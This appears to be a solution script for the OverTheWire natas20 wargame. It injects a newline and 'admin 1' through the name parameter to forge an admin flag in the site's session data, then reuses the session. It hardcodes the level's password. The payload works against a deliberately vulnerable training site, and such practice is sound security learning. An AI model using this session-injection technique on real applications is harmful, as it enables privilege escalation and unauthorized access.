#! env python3.9

import requests, time

site1 = "http://natas20.natas.labs.overthewire.org/index.php?debug&name=admin\";\nadmin 1"
site2 = "http://natas20.natas.labs.overthewire.org/index.php?debug"
user = "natas20"
pswd = "guVaZ3ET35LbgbFMoaN5tFcYT1jEP7UH"

session = requests.Session()

r = session.get(site1, auth=(user, pswd))
print(r.text)
print()
print(session.cookies.get_dict())

time.sleep(1)

r = session.get(site2, auth=(user, pswd))
print(r.text)
print()
print(session.cookies.get_dict())



